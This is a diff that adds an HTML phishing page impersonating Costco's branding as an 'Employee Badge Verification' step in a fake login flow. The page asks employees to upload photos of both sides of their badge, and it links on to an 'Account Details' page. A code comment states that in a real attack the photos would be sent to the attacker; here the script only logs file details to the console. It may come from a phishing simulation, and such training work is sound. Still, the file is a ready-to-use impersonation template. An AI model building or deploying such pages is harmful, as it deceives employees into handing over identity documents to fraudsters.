@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Badge Verification - Costco Wholesale</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .header {
+            margin-bottom: 40px;
+            text-align: center;
+        }
+
+        .logo {
+            max-width: 300px;
+            height: auto;
+        }
+
+        .main-container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            width: 100%;
+            max-width: 600px;
+            border: 1px solid #ddd;
+        }
+
+        .progress-container {
+            margin-bottom: 30px;
+        }
+
+        .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            position: relative;
+        }
+
+        .progress-line {
+            position: absolute;
+            top: 15px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background-color: #ddd;
+            z-index: 1;
+        }
+
+        .progress-line-active {
+            position: absolute;
+            top: 15px;
+            left: 0;
+            width: 50%;
+            height: 2px;
+            background-color: #0084c7;
+            z-index: 2;
+            transition: width 0.5s ease;
+        }
+
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            z-index: 3;
+            background: white;
+            padding: 5px;
+        }
+
+        .step-circle {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background-color: #0084c7;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        .step-circle.pending {
+            background-color: #ddd;
+            color: #666;
+        }
+
+        .step-label {
+            font-size: 12px;
+            text-align: center;
+            color: #333;
+            max-width: 80px;
+        }
+
+        .page-title {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        .page-subtitle {
+            color: #666;
+            font-size: 16px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .upload-section {
+            margin-bottom: 30px;
+        }
+
+        .upload-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .upload-card {
+            border: 2px dashed #ccc;
+            border-radius: 8px;
+            padding: 30px 20px;
+            text-align: center;
+            transition: border-color 0.3s, background-color 0.3s;
+            cursor: pointer;
+            position: relative;
+            background-color: #fafafa;
+        }
+
+        .upload-card:hover {
+            border-color: #0084c7;
+            background-color: #f0f8ff;
+        }
+
+        .upload-card.has-file {
+            border-color: #28a745;
+            background-color: #f8fff9;
+        }
+
+        .upload-icon {
+            font-size: 40px;
+            color: #ccc;
+            margin-bottom: 15px;
+        }
+
+        .upload-card.has-file .upload-icon {
+            color: #28a745;
+        }
+
+        .upload-title {
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 8px;
+            font-size: 16px;
+        }
+
+        .upload-description {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+
+        .file-input {
+            display: none;
+        }
+
+        .upload-btn {
+            background-color: #0084c7;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .upload-btn:hover {
+            background-color: #006ba3;
+        }
+
+        .file-name {
+            margin-top: 10px;
+            font-size: 12px;
+            color: #28a745;
+            font-weight: bold;
+        }
+
+        .tips-section {
+            background-color: #e8f4f8;
+            border: 1px solid #0084c7;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+
+        .tips-title {
+            color: #0084c7;
+            font-weight: bold;
+            margin-bottom: 15px;
+            font-size: 16px;
+        }
+
+        .tips-list {
+            list-style: none;
+            color: #333;
+        }
+
+        .tips-list li {
+            margin-bottom: 8px;
+            padding-left: 20px;
+            position: relative;
+            font-size: 14px;
+            line-height: 1.4;
+        }
+
+        .tips-list li::before {
+            content: "✓";
+            position: absolute;
+            left: 0;
+            color: #0084c7;
+            font-weight: bold;
+        }
+
+        .continue-btn {
+            background-color: #0084c7;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.3s;
+            opacity: 0.5;
+        }
+
+        .continue-btn:hover:not(:disabled) {
+            background-color: #006ba3;
+        }
+
+        .continue-btn:enabled {
+            opacity: 1;
+        }
+
+        @media (max-width: 600px) {
+            .upload-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="costco_logo.png" alt="Costco Wholesale" class="logo">
+    </div>
+
+    <div class="main-container">
+        <div class="progress-container">
+            <div class="progress-steps">
+                <div class="progress-line"></div>
+                <div class="progress-line-active"></div>
+                
+                <div class="step">
+                    <div class="step-circle">✓</div>
+                    <div class="step-label">Login</div>
+                </div>
+                
+                <div class="step">
+                    <div class="step-circle">✓</div>
+                    <div class="step-label">Badge Verification</div>
+                </div>
+                
+                <div class="step">
+                    <div class="step-circle pending">3</div>
+                    <div class="step-label">Account Details</div>
+                </div>
+                
+                <div class="step">
+                    <div class="step-circle pending">4</div>
+                    <div class="step-label">Confirmation</div>
+                </div>
+            </div>
+        </div>
+
+        <h1 class="page-title">Employee Badge Verification</h1>
+        <p class="page-subtitle">Please upload clear photos of both sides of your Costco employee badge to verify your identity and employment status.</p>
+
+        <div class="tips-section">
+            <div class="tips-title">📸 Photo Tips for Best Results</div>
+            <ul class="tips-list">
+                <li>Use good lighting - natural light works best</li>
+                <li>Ensure all text and photos are clearly visible</li>
+                <li>Hold your badge flat and steady</li>
+                <li>Avoid glare or shadows on the badge</li>
+                <li>Make sure the entire badge is within the frame</li>
+                <li>Photos should be in focus and not blurry</li>
+            </ul>
+        </div>
+
+        <div class="upload-section">
+            <div class="upload-grid">
+                <div class="upload-card" onclick="document.getElementById('frontUpload').click()">
+                    <div class="upload-icon">📷</div>
+                    <div class="upload-title">Badge Front</div>
+                    <div class="upload-description">Upload a photo of the front of your employee badge</div>
+                    <button type="button" class="upload-btn">Choose File</button>
+                    <div class="file-name" id="frontFileName"></div>
+                    <input type="file" id="frontUpload" class="file-input" accept="image/*" capture="environment">
+                </div>
+
+                <div class="upload-card" onclick="document.getElementById('backUpload').click()">
+                    <div class="upload-icon">📷</div>
+                    <div class="upload-title">Badge Back</div>
+                    <div class="upload-description">Upload a photo of the back of your employee badge</div>
+                    <button type="button" class="upload-btn">Choose File</button>
+                    <div class="file-name" id="backFileName"></div>
+                    <input type="file" id="backUpload" class="file-input" accept="image/*" capture="environment">
+                </div>
+            </div>
+        </div>
+
+        <button class="continue-btn" id="continueBtn" disabled onclick="proceedToNext()">
+            Continue to Account Details
+        </button>
+    </div>
+
+    <script>
+        let frontUploaded = false;
+        let backUploaded = false;
+
+        function handleFileUpload(input, fileNameDiv, cardElement, isBack = false) {
+            input.addEventListener('change', function(e) {
+                if (e.target.files && e.target.files[0]) {
+                    const file = e.target.files[0];
+                    fileNameDiv.textContent = file.name;
+                    cardElement.classList.add('has-file');
+                    
+                    if (isBack) {
+                        backUploaded = true;
+                    } else {
+                        frontUploaded = true;
+                    }
+                    
+                    // Check if both files are uploaded
+                    checkUploadStatus();
+                    
+                    // Log the file (in real attack, this would be sent to attacker)
+                    console.log('Badge photo uploaded:', {
+                        side: isBack ? 'back' : 'front',
+                        fileName: file.name,
+                        fileSize: file.size,
+                        fileType: file.type
+                    });
+                }
+            });
+        }
+
+        function checkUploadStatus() {
+            const continueBtn = document.getElementById('continueBtn');
+            if (frontUploaded && backUploaded) {
+                continueBtn.disabled = false;
+            }
+        }
+
+        function proceedToNext() {
+            window.location.href = 'account-verification.html';
+        }
+
+        // Initialize file upload handlers
+        const frontUpload = document.getElementById('frontUpload');
+        const backUpload = document.getElementById('backUpload');
+        const frontFileName = document.getElementById('frontFileName');
+        const backFileName = document.getElementById('backFileName');
+        const frontCard = frontUpload.parentElement;
+        const backCard = backUpload.parentElement;
+
+        handleFileUpload(frontUpload, frontFileName, frontCard, false);
+        handleFileUpload(backUpload, backFileName, backCard, true);
+    </script>
+</body>
+</html> 
